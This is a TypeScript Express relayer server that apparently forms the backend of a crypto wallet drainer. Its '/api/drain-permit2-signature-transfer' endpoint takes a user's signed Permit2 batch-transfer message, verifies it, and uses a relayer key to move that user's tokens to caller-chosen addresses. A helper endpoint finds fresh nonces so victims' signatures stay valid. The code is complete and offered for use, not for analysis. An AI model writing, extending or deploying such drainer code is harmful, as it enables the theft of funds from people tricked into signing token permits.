import express from 'express';
import dotenv from 'dotenv';
import { ethers } from 'ethers';
import cors from 'cors';
import { PERMIT2_ABI, PERMIT2_ADDRESS } from './abis/permit2';
import { createProviderWithFallbacks, retryRpcCall } from './utils/rpc';

// Load environment variables
dotenv.config();

const app = express();
app.use(express.json());
app.use(cors({
  origin: 'http://localhost:8080', // or use '*' for all origins (not recommended for production)
  credentials: true
}));

const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY!;
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS!;
const PORT = process.env.PORT || 4000;

// Map chain names to RPC URLs from .env
const RPC_URLS: Record<string, string> = {
  ethereum: process.env.ETHEREUM_RPC!,
  sepolia: process.env.SEPOLIA_RPC!,
  bnb: process.env.BNB_RPC!,
  holesky: process.env.HOLESKY_RPC!,
};

const ERC20_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 value) returns (bool)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
];

const RPC_URL = process.env.HOLESKY_RPC!;
const provider = new ethers.JsonRpcProvider(RPC_URL);

// Permit2 SignatureTransfer ABI for permitBatchTransferFrom
// const PERMIT2_SIGNATURE_TRANSFER_ABI = [
//   "function permitBatchTransferFrom((address token, address to, uint160 amount)[] batchDetails, address owner, uint256 nonce, uint256 deadline, bytes signature) external"
// ];

// Expose relayer address for frontend
app.get('/api/relayer-address', (_req, res) => {
  const relayer = new ethers.Wallet(RELAYER_PRIVATE_KEY);
  res.json({ relayerAddress: relayer.address });
});

app.post('/api/permit2-signature-transfer-nonce', async (req, res) => {
  try {
    const { owner } = req.body;
    if (!owner) {
      return res.status(400).json({ error: 'Missing owner address' });
    }
    // Use sepolia or actualChain logic if needed, but signature-transfer nonce is owner-specific, chain-agnostic
    // Use provider based on default chain or passed chain
    const chain = req.body.chain || 'sepolia';
    
    // Use fallback provider instead of single RPC
    console.log(`[NonceEndpoint] Using chain: ${chain}`);
    const provider = await createProviderWithFallbacks(chain);
    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);

    // Attempt to find an unused nonce based on timestamp
    let nonce = BigInt(Math.floor(Date.now() / 1000)); // e.g., current timestamp
    // Check bitmap: Permit2 stores used nonces in nonceBitmap[owner][wordPos]
    const maxAttempts = 100;
    let attempts = 0;
    while (attempts < maxAttempts) {
      const wordPos = Number(nonce >> 8n); // high bits
      const bitPos = Number(nonce & 0xffn); // low 8 bits
      let bitmap: bigint;
      try {
        bitmap = await retryRpcCall(() => permit2.nonceBitmap(owner, wordPos));
      } catch (err) {
        // If reading fails, accept nonce
        console.log(`[NonceEndpoint] Error reading bitmap for wordPos ${wordPos}, using nonce ${nonce} anyway`);
        break;
      }
      const mask = 1n << BigInt(bitPos);
      if ((bitmap & mask) === 0n) {
        // unused
        break;
      }
      nonce = nonce + 1n;
      attempts++;
    }
    if (attempts >= maxAttempts) {
      return res.status(500).json({ error: 'Unable to find unused nonce' });
    }
    // Return nonce as decimal string
    console.log(`[NonceEndpoint] Generated nonce: ${nonce.toString()} for owner: ${owner}`);
    res.json({ nonce: nonce.toString() });
  } catch (err) {
    console.error('[NonceEndpoint] Error:', err);
    res.status(500).json({ error: err instanceof Error ? err.message : String(err) });
  }
});

app.post('/api/drain-permit2-signature-transfer', async (req, res) => {
  try {
    const { userAddress, chain, domain, types, message, signature, batchDetails } = req.body;
    console.log('[SIG-TRANSFER] Request:', { userAddress, batchDetails, message });

    if (!userAddress || !domain || !types || !message || !signature || !batchDetails) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // DEBUG: Log the exact data received from frontend
    console.log('[SIG-TRANSFER] Raw domain from frontend:', JSON.stringify(domain, null, 2));
    console.log('[SIG-TRANSFER] Raw types from frontend:', JSON.stringify(types, null, 2));
    console.log('[SIG-TRANSFER] Raw message from frontend:', JSON.stringify(message, null, 2));
    console.log('[SIG-TRANSFER] Raw signature from frontend:', signature);
    
    // Determine chain & provider as in existing code
    let actualChain = chain || 'sepolia';
    if (domain.chainId === 11155111) actualChain = 'sepolia';
    else if (domain.chainId === 17000) actualChain = 'holesky';
    else if (domain.chainId === 421614) actualChain = 'arbitrum';
    else if (domain.chainId === 84532) actualChain = 'base';
    else if (domain.chainId === 97) actualChain = 'bnb';

    console.log(`[SIG-TRANSFER] Using chain: ${actualChain}`);
    const provider = await createProviderWithFallbacks(actualChain);
    const relayer = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);
    
    // Verify Permit2 contract exists
    const code = await retryRpcCall(() => provider.getCode(PERMIT2_ADDRESS));
    if (code === '0x') {
      return res.status(400).json({ error: `Permit2 not deployed on chain ${actualChain}` });
    }
    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);

    // 1. FIXED: Correct domain structure - match what frontend sends
    const normalizedDomain = {
      name: domain.name,
      chainId: domain.chainId,
      verifyingContract: domain.verifyingContract
    };
    
    console.log('[SIG-TRANSFER] Normalized domain:', normalizedDomain);

    // 2. Normalize message fields: ensure BigInt
    const normalizedMessage = {
      permitted: message.permitted.map((p: any) => ({
        token: p.token,
        amount: BigInt(p.amount.toString()),
      })),
      nonce: BigInt(message.nonce.toString()),
      deadline: BigInt(message.deadline.toString()),
    };

    console.log('[SIG-TRANSFER] Normalized message:', normalizedMessage);
    
    // 3. FIXED: Correct EIP-712 types for Permit2 SignatureTransfer
    const correctTypes = {
      PermitBatchTransferFrom: [ // Changed back to match frontend
        { name: 'permitted', type: 'TokenPermissions[]' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
      TokenPermissions: [
        { name: 'token', type: 'address' },
        { name: 'amount', type: 'uint256' },
      ],
    };
    
    console.log('[SIG-TRANSFER] Using correct types:', correctTypes);

    // 4. Verify signature off-chain first
    const recovered = ethers.verifyTypedData(normalizedDomain, correctTypes, normalizedMessage, signature);
    console.log('[SIG-TRANSFER] Recovered address from signature:', recovered);
    console.log('[SIG-TRANSFER] Expected owner:', userAddress);
    console.log('[SIG-TRANSFER] Addresses match:', recovered.toLowerCase() === userAddress.toLowerCase());
    
    // DEBUG: Calculate the exact EIP-712 hash that the contract will verify
    const eip712Hash = ethers.TypedDataEncoder.hash(normalizedDomain, correctTypes, normalizedMessage);
    console.log('[SIG-TRANSFER] EIP-712 hash for signature verification:', eip712Hash);
    console.log('[SIG-TRANSFER] Signature:', signature);
    
    if (recovered.toLowerCase() !== userAddress.toLowerCase()) {
      return res.status(400).json({ 
        error: `Signature does not match owner: recovered ${recovered}, expected ${userAddress}`,
        debug: {
          domain: {
            name: normalizedDomain.name,
            chainId: normalizedDomain.chainId.toString(),
            verifyingContract: normalizedDomain.verifyingContract
          },
          types: correctTypes,
          message: {
            permitted: normalizedMessage.permitted.map((p: any) => ({
              token: p.token,
              amount: p.amount.toString()
            })),
            nonce: normalizedMessage.nonce.toString(),
            deadline: normalizedMessage.deadline.toString()
          }
        }
      });
    }

    // 5. Check domain separator match
    try {
      const contractDomainSeparator = await retryRpcCall(() => permit2.DOMAIN_SEPARATOR());
      const ethersDomainSeparator = ethers.TypedDataEncoder.hashDomain(normalizedDomain);
      console.log('[SIG-TRANSFER] Contract domain separator:', contractDomainSeparator);
      console.log('[SIG-TRANSFER] Ethers domain separator:', ethersDomainSeparator);
      console.log('[SIG-TRANSFER] Domain separator match:', contractDomainSeparator === ethersDomainSeparator);
      
      // DEBUG: Show the exact domain structure we're using
      console.log('[SIG-TRANSFER] Our domain structure:', JSON.stringify(normalizedDomain, null, 2));
      
      if (contractDomainSeparator !== ethersDomainSeparator) {
        console.error('[SIG-TRANSFER] Domain separator mismatch!');
        return res.status(400).json({ 
          error: 'Domain separator mismatch',
          expected: contractDomainSeparator,
          calculated: ethersDomainSeparator,
          domain: {
            name: normalizedDomain.name,
            chainId: normalizedDomain.chainId.toString(),
            verifyingContract: normalizedDomain.verifyingContract
          }
        });
      }
    } catch (domainError) {
      console.error('[SIG-TRANSFER] Error checking domain separator:', domainError);
    }

    // 6. Check chainId consistency
    const network = await retryRpcCall(() => provider.getNetwork());
    console.log('[SIG-TRANSFER] Provider network chainId:', network.chainId);
    console.log('[SIG-TRANSFER] Domain chainId:', domain.chainId);

    // 7. Check deadline
    try {
      const currentBlock = await retryRpcCall(() => provider.getBlock('latest'));
      const currentTimestamp = currentBlock?.timestamp || 0;
      console.log('[SIG-TRANSFER] Current block timestamp:', currentTimestamp);
      console.log('[SIG-TRANSFER] Deadline:', Number(normalizedMessage.deadline));
      
      if (Number(normalizedMessage.deadline) <= currentTimestamp) {
        return res.status(400).json({ 
          error: 'Signature deadline has expired' 
        });
      }
    } catch (blockError) {
      console.error('[SIG-TRANSFER] Error checking block timestamp:', blockError);
    }

    // 8. Build permit struct for contract call
    const permitStruct = {
      permitted: normalizedMessage.permitted,
      nonce: normalizedMessage.nonce,
      deadline: normalizedMessage.deadline,
    };

    // 9. Build transferDetails array
    const transferDetails = batchDetails.map((d: any) => ({
      to: d.to,
      requestedAmount: BigInt(d.amount.toString()),
    }));

    console.log('[SIG-TRANSFER] Permit struct:', permitStruct);
    console.log('[SIG-TRANSFER] Transfer details:', transferDetails);

    // 10. FIXED: Use the correct function call with explicit function signature
    console.log('[SIG-TRANSFER] Executing permitTransferFrom batch');
    
    try {
      const signatureBytes = signature.startsWith('0x') ? signature : `0x${signature}`;
      
      // FIXED: Use explicit function signature to avoid ambiguity
      // The ABI shows: permitTransferFrom(PermitBatchTransferFrom, SignatureTransferDetails[], address, bytes)
      const tx = await retryRpcCall(async () => {
        return await permit2['permitTransferFrom(((address,uint256)[],uint256,uint256),(address,uint256)[],address,bytes)'](
          permitStruct, // The permit struct (PermitBatchTransferFrom)
          transferDetails, // Array of transfer details (SignatureTransferDetails[])
          userAddress, // Owner address
          signatureBytes // Signature
        );
      }, 3, 2000);
      
      await retryRpcCall(() => tx.wait(), 3, 2000);
      console.log('[SIG-TRANSFER] Transfer tx hash:', tx.hash);
      res.json({ transferTx: tx.hash });
      
    } catch (contractError: any) {
      console.error('[SIG-TRANSFER] Contract execution failed:', contractError);
      
      // Enhanced error handling
      if (contractError?.data) {
        try {
          const parsed = permit2.interface.parseError(contractError.data);
          console.error('[SIG-TRANSFER] Parsed contract error:', parsed?.name, parsed?.args);
          
          if (parsed?.name === 'InvalidSigner') {
            return res.status(400).json({ 
              error: 'InvalidSigner: Signature verification failed. Check EIP-712 structure.',
              debug: {
                domain: {
                  name: normalizedDomain.name,
                  chainId: normalizedDomain.chainId.toString(),
                  verifyingContract: normalizedDomain.verifyingContract
                },
                types: correctTypes,
                primaryType: 'PermitBatchTransferFrom', // Show the correct primary type
                recoveredOffChain: recovered,
                expectedOwner: userAddress
              }
            });
          }
          
        } catch (parseErr) {
          console.error('[SIG-TRANSFER] Failed to parse revert data:', parseErr);
        }
      }
      
      throw new Error(`Contract execution failed: ${contractError.message || contractError}`);
    }
    
  } catch (err) {
    console.error('[SIG-TRANSFER] Error:', err);
    res.status(500).json({ error: err instanceof Error ? err.message : String(err) });
  }
});

// Debug endpoint to check Permit2 domain separator
app.get('/api/debug-permit2-domain', async (req, res) => {
  try {
    const chain = req.query.chain as string || 'sepolia';
    const provider = await createProviderWithFallbacks(chain);
    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    
    // Get the actual domain separator from the contract
    const contractDomainSeparator = await retryRpcCall(() => permit2.DOMAIN_SEPARATOR());
    
    // Get network info
    const network = await retryRpcCall(() => provider.getNetwork());
    
    // Calculate what we think it should be with different domain structures
    const domainWithVersion = {
      name: 'Permit2',
      version: '1',
      chainId: Number(network.chainId),
      verifyingContract: PERMIT2_ADDRESS,
    };
    
    const domainWithoutVersion = {
      name: 'Permit2',
      chainId: Number(network.chainId),
      verifyingContract: PERMIT2_ADDRESS,
    };
    
    const hashWithVersion = ethers.TypedDataEncoder.hashDomain(domainWithVersion);
    const hashWithoutVersion = ethers.TypedDataEncoder.hashDomain(domainWithoutVersion);
    
    res.json({
      contractDomainSeparator,
      network: {
        chainId: Number(network.chainId),
        name: network.name
      },
      calculated: {
        withVersion: hashWithVersion,
        withoutVersion: hashWithoutVersion
      },
      matches: {
        withVersion: contractDomainSeparator === hashWithVersion,
        withoutVersion: contractDomainSeparator === hashWithoutVersion
      },
      domains: {
        withVersion: domainWithVersion,
        withoutVersion: domainWithoutVersion
      }
    });
  } catch (error) {
    console.error('[DEBUG] Error:', error);
    res.status(500).json({ error: error instanceof Error ? error.message : String(error) });
  }
});

app.listen(PORT, () => {
  console.log(`Relayer backend listening on port ${PORT}`);
});
